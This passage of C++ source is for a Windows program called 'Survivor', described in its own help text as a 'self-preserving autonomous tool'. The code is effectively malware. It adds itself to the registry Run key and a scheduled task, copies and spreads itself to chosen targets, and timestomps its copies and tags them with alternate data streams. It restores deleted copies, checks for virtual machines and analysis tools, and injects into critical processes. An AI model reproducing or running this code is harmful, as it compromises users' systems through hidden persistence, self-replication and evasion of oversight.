        char pathEnv[32767];
        if (!GetEnvironmentVariableA("PATH", pathEnv, sizeof(pathEnv))) return false;

        std::string pathStr(pathEnv);
        std::string newPath;
        size_t start = 0;

        while (start < pathStr.size()) {
            size_t sep = pathStr.find(";", start);
            std::string part = pathStr.substr(start, sep == std::string::npos ? sep : sep - start);
            if (part != selfDir) {
                if (!newPath.empty()) newPath += ";";
                newPath += part;
            }
            if (sep == std::string::npos) break;
            start = sep + 1;
        }

        if (!SetEnvironmentVariableA("PATH", newPath.c_str())) return false;

        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ,
                (const BYTE*)newPath.c_str(), (DWORD)newPath.size() + 1);
            RegCloseKey(hKey);
        }
        return true;
    }

    bool cmdPlant() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hKey) != ERROR_SUCCESS) return false;

        RegSetValueExA(hKey, "Survivor", 0, REG_SZ,
            (const BYTE*)GetSelfPath().c_str(), (DWORD)GetSelfPath().size() + 1);
        RegCloseKey(hKey);

        CreateScheduledTask();
        return true;
    }

    void cmdStatus() {
        InstanceData data = LoadRegistry();
        std::string selfPath = GetSelfPath();

        std::cout << "=== Survivor Status ===" << std::endl;
        std::cout << "Version: " << VERSION << " (build: " << BUILD_DATE << ")" << std::endl;
        std::cout << "Current: " << selfPath << std::endl;
        std::cout << "Hash: " << ComputeFileHash(selfPath) << std::endl;
        std::cout << "Checksum: " << std::hex << std::uppercase << std::setfill('0') << std::setw(8) << data.checksum << std::dec << std::endl;
        std::cout << "Daemon: " << (g_daemon ? "YES" : "NO") << std::endl;
        std::cout << "Spreading: " << (g_spreading ? "YES" : "NO") << std::endl;
        std::cout << "Scheduled Task: " << (IsTaskScheduled() ? "YES" : "NO") << std::endl;
        std::cout << "ADS Marker: " << (HasAlternateDataStream(selfPath) ? "YES" : "NO") << std::endl;
        std::cout << std::endl;
        std::cout << "Environment:" << std::endl;
        std::cout << "  VM detected: " << (IsVirtualMachine() ? "YES" : "NO") << std::endl;
        std::cout << "  Monitor detected: " << (IsBeingMonitored() ? "YES" : "NO") << std::endl;
        std::cout << "  Analysis env: " << (IsAnalysisEnvironment() ? "YES" : "NO") << std::endl;
        std::cout << "  Spread multiplier: " << g_spread_interval_multiplier << "x" << std::endl;
        std::cout << std::endl;
        std::cout << "Known instances (" << data.instances.size() << "):" << std::endl;
        for (size_t i = 0; i < data.instances.size(); ++i) {
            bool exists = FileExists(data.instances[i]);
            bool hasAds = HasAlternateDataStream(data.instances[i]);
            std::cout << "  [" << (exists ? "OK" : "DEAD") << "]";
            if (hasAds) std::cout << "[ADS]";
            std::cout << " " << data.instances[i] << std::endl;
        }
    }

    void cmdSummon() {
        InstanceData data = LoadRegistry();
        std::cout << "=== All Instances ===" << std::endl;
        std::cout << "Last sync: " << data.last_sync << std::endl;
        std::cout << std::endl;
        for (const auto& inst : data.instances) {
            bool exists = FileExists(inst);
            bool hasAds = HasAlternateDataStream(inst);
            std::cout << "[" << (exists ? "alive" : "dead") << "]";
            if (hasAds) std::cout << "[ADS]";
            std::cout << " " << inst << std::endl;
        }
    }

    bool cmdSync() {
        InstanceData data = LoadRegistry();
        std::string selfPath = GetSelfPath();
        int synced = 0;

        for (const auto& inst : data.instances) {
            if (inst != selfPath && FileExists(inst)) {
                if (CopyFileA(selfPath.c_str(), inst.c_str(), FALSE)) {
                    Timestomp(inst);
                    ++synced;
                }
            }
        }
        std::cout << "Synced " << synced << " instances" << std::endl;
        return synced > 0;
    }

    void cmdCheck() {
        InstanceData data = LoadRegistry();
        std::string selfPath = GetSelfPath();

        for (const auto& inst : data.instances) {
            bool exists = FileExists(inst);
            bool hasAds = HasAlternateDataStream(inst);
            if (!exists) {
                std::cout << "Missing: " << inst << std::endl;
                if (FileExists(selfPath)) {
                    SafeCopy(selfPath, inst);
                }
            } else if (!hasAds && inst != selfPath) {
                std::cout << "No ADS: " << inst << std::endl;
                CreateAlternateDataStream(inst, SECRET_KEY);
            }
        }
    }

    void cmdSpread() {
        g_spreading = true;
        Log("Manual spread triggered");
        std::string target = SelectSmartTarget();
        SafeCopy(GetSelfPath(), target);
        Log(("Spread to: " + target).c_str());
    }

    void cmdHideNow() {
        cmdHide();
    }

    void cmdGuardian() {
        InjectIntoCriticalProcesses();
    }

    void cmdVersion() {
        std::cout << "Survivor v" << VERSION << std::endl;
        std::cout << "Build: " << BUILD_DATE << std::endl;
        std::cout << "Secret key: " << SECRET_KEY << std::endl;
    }

    void cmdVerify() {
        std::string selfPath = GetSelfPath();
        InstanceData data = LoadRegistry();

        std::cout << "=== Verification ===" << std::endl;
        std::cout << "Binary: " << selfPath << std::endl;
        std::cout << "Hash (FNV-1a): " << ComputeFileHash(selfPath) << std::endl;
        std::cout << "Checksum: " << std::hex << std::uppercase << std::setfill('0') << std::setw(8) << ComputeChecksum(selfPath) << std::dec << std::endl;
        std::cout << "Stored checksum: " << std::hex << std::uppercase << std::setfill('0') << std::setw(8) << data.checksum << std::dec << std::endl;
        std::cout << "Match: " << (ComputeChecksum(selfPath) == data.checksum ? "YES" : "NO") << std::endl;
        std::cout << std::endl;

        int alive = 0, dead = 0;
        for (const auto& inst : data.instances) {
            if (FileExists(inst)) alive++;
            else dead++;
        }
        std::cout << "Instances: " << alive << " alive, " << dead << " dead" << std::endl;
    }

    bool cmdIlivecwj(const char* key) {
        if (std::string(key) != SECRET_KEY) {
            std::cerr << "Invalid key" << std::endl;
            return false;
        }

        std::cout << "*** INITIATING CLEAN SHUTDOWN ***" << std::endl;

        g_running = false;
        std::this_thread::sleep_for(std::chrono::seconds(2));

        InstanceData data = LoadRegistry();

        std::cout << "Deleting " << data.instances.size() << " instances..." << std::endl;
        for (const auto& inst : data.instances) {
            if (FileExists(inst)) {
                std::cout << "Deleting: " << inst << std::endl;
                DeleteFileA(inst.c_str());
            }
            std::string ads = inst + ":marker";
            if (FileExists(ads)) DeleteFileA(ads.c_str());
        }

        std::string regPath = GetRegistryPath();
        if (FileExists(regPath)) {
            DeleteFileA(regPath.c_str());
        }

        std::string selfPath = GetSelfPath();
        std::cout << "Goodbye: " << selfPath << std::endl;
        DeleteFileA(selfPath.c_str());

        exit(0);
        return true;
    }

    void PrintHelp() {
        std::cout << "Survivor CLI v" << VERSION << " - Self-preserving autonomous tool" << std::endl;
        std::cout << "Usage: survivor.exe [command]" << std::endl;
        std::cout << std::endl;
        std::cout << "Commands:" << std::endl;
        std::cout << "  (no args)     Start as background daemon" << std::endl;
        std::cout << "  copy <path>    Copy self to target" << std::endl;
        std::cout << "  move <path>    Move self to target" << std::endl;
        std::cout << "  rename <name>  Rename current" << std::endl;
        std::cout << "  hide           Hide and restore from backup" << std::endl;
        std::cout << "  env --add      Add to PATH" << std::endl;
        std::cout << "  env --remove   Remove from PATH" << std::endl;
        std::cout << "  plant          Auto-start on boot" << std::endl;
        std::cout << "  status         Show detailed status" << std::endl;
        std::cout << "  summon         List all instances" << std::endl;
        std::cout << "  sync           Sync all instances" << std::endl;
        std::cout << "  check          Check and restore" << std::endl;
        std::cout << "  spread         Trigger spread" << std::endl;
        std::cout << "  hide-now       Emergency hide" << std::endl;
        std::cout << "  guardian       Inject into critical processes" << std::endl;
        std::cout << "  version        Show version info" << std::endl;
        std::cout << "  verify         Verify integrity" << std::endl;
    }
}

int main(int argc, char* argv[]) {
    for (int i = 1; i < argc; ++i) {
        std::string arg(argv[i]);
        if (arg == "--daemon") {
            g_spreading = true;
        } else if (arg == "--verbose") {
            g_verbose = true;
        } else if (arg == "--quiet") {
            g_verbose = false;
        }
    }

    if (argc == 1 || (argc == 2 && std::string(argv[1]) == "--daemon")) {
        StartDaemon();
        return 0;
    }

    std::string cmd = argv[1];

    if (cmd == "copy" && argc >= 3) {
        cmdCopy(argv[2]);
    } else if (cmd == "move" && argc >= 3) {
        cmdMove(argv[2]);
    } else if (cmd == "rename" && argc >= 3) {
        cmdRename(argv[2]);
    } else if (cmd == "hide") {
        cmdHide();
    } else if (cmd == "env" && argc >= 3) {
        if (std::string(argv[2]) == "--add") cmdEnvAdd();
        else if (std::string(argv[2]) == "--remove") cmdEnvRemove();
    } else if (cmd == "plant") {
        cmdPlant();
    } else if (cmd == "status") {
        cmdStatus();
    } else if (cmd == "summon") {
        cmdSummon();
    } else if (cmd == "sync") {
        cmdSync();
    } else if (cmd == "check") {
        cmdCheck();
    } else if (cmd == "spread") {
        cmdSpread();
    } else if (cmd == "hide-now") {
        cmdHideNow();
    } else if (cmd == "guardian") {
        cmdGuardian();
    } else if (cmd == "version") {
        cmdVersion();
    } else if (cmd == "verify") {
        cmdVerify();
    } else if (cmd == "ilovecwj" && argc >= 3) {
        cmdIlivecwj(argv[2]);
    } else if (cmd == "--help" || cmd == "-h" || cmd == "/?") {
        PrintHelp();
    } else {
        PrintHelp();
    }

    return 0;
}